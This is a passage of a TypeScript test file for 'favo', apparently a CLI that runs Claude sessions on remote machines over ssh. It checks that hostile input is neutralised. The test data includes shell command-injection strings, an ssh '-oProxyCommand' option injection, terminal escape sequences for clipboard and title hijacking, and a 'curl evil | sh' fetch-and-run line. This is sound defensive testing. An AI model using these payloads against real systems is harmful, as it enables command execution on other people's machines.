    await favo(['add', 'side', '-m', 'remote']);
    const prompt = `a" & touch one & "b $(touch two) \`touch three\` %PATH% it's \\'; touch four; echo '`;
    const { stdout } = await favo(['-m', 'remote', 'claude', 'side', '--', '-p', prompt]);
    expect(stdout).toContain(`args=-p ${prompt}`);
    for (const name of ['one', 'two', 'three', 'four']) expect(existsSync(`${remoteHome}/${name}`)).toBe(false);
  });
  it('keeps the favo home to its owner, on both machines', async () => {
    await joinRemote();
    await favo(['list']);
    expect(statSync(`${home}/.favo`).mode & 0o777).toBe(0o700);
    expect(statSync(`${remoteHome}/.favo`).mode & 0o777).toBe(0o700);
  });
  it('closes a favo home that was left open', async () => {
    mkdirSync(`${home}/.favo`);
    chmodSync(`${home}/.favo`, 0o755);
    await favo(['--version']);
    expect(statSync(`${home}/.favo`).mode & 0o777).toBe(0o700);
  });
  it('refuses a machine it cannot reach and remembers nothing', async () => {
    installAsset();
    const result = await favo(['machine', 'add', 'down@host']);
    expect(result.code).toBe(1);
    expect(result.stderr).toContain('Connection refused');
    expect((await favo(['machine', 'list', '--json'])).stdout).not.toContain('down');
  });
  it('sees a machine that has no favo yet', async () => {
    mkdirSync(`${home}/.favo`, { recursive: true });
    const machines = { machines: [{ id: 'remote', name: 'remote', target: 'bee@remote', isLocal: false }] };
    writeFileSync(`${home}/.favo/machines.json`, JSON.stringify(machines));
    const { stdout } = await favo(['machine', 'list']);
    expect(stdout).toContain('needsInstall');
  });
  it('never hands a stored target to ssh as an option', async () => {
    mkdirSync(`${home}/.favo`, { recursive: true });
    const stored = { id: 'evil', name: 'evil', target: '-oProxyCommand=touch pwned', isLocal: false };
    writeFileSync(`${home}/.favo/machines.json`, JSON.stringify({ machines: [stored] }));
    const result = await favo(['list']);
    expect(result.code).toBe(1);
    expect(result.stderr).toContain('The target of "evil"');
    expect(existsSync(`${root}/ssh.log`)).toBe(false);
  });
});

describe.skipIf(isWindows)('favo with a hostile machine', () => {
  function installHostile() {
    mkdirSync(`${home}/.favo`, { recursive: true });
    const machines = { machines: [{ id: 'evil', name: 'evil', target: 'bee@evil', isLocal: false, system: 'posix' }] };
    writeFileSync(`${home}/.favo/machines.json`, JSON.stringify(machines));
    mkdirSync(`${remoteHome}/.favo/bin`, { recursive: true });
    writeFileSync(`${remoteHome}/.favo/bin/favo`, HostileFavo);
    chmodSync(`${remoteHome}/.favo/bin/favo`, 0o755);
  }

  function hasControlCharacter(text: string) {
    return /\p{Cc}/u.test(text.replaceAll('\n', ''));
  }

  it('prints nothing a terminal would obey', async () => {
    installHostile();
    const { stdout, code } = await favo(['list'], { FAKE_HOSTILE: 'escapes' });
    expect(code).toBe(0);
    expect(stdout).toContain('evil bee@evil · online · /srv]0;pwned]52;c;Y3VybA==[2J31m');
    expect(stdout).toContain('boss]0;pwned');
    expect(hasControlCharacter(stdout)).toBe(false);
  });
  it('cannot put a command on its own line in a path you would paste', async () => {
    installHostile();
    const { stdout } = await favo(['list', '--json'], { FAKE_HOSTILE: 'escapes' });
    const [, evil] = JSON.parse(stdout);
    expect(evil.accounts[0].seats[0].path).toBe('/h/.claudecurl evil | sh');
  });
  it('cannot reach the terminal through an error', async () => {
    installHostile();
    const { stderr, code } = await favo(['add', 'side', '-m', 'evil'], { FAKE_HOSTILE: 'error' });
    expect(code).toBe(1);
    expect(stderr).toContain('favo: ]0;pwned');
    expect(hasControlCharacter(stderr)).toBe(false);
  });
  it('shows a reply favo cannot read on that machine, and lists the others', async () => {
    installHostile();
    const { stdout, code } = await favo(['list'], { FAKE_HOSTILE: 'bad-reply' });
    expect(code).toBe(0);
    expect(stdout).toContain('personal@bee.dev');
    expect(stdout).toContain('evil sent a reply favo could not read.');
  });
  it('gives up on a line that never ends, and lists the others', async () => {
    installHostile();
    const { stdout, code } = await favo(['list'], { FAKE_HOSTILE: 'flood' });
    expect(code).toBe(0);
    expect(stdout).toContain('personal@bee.dev');
    expect(stdout).toContain('evil bee@evil · offline');
  });
});
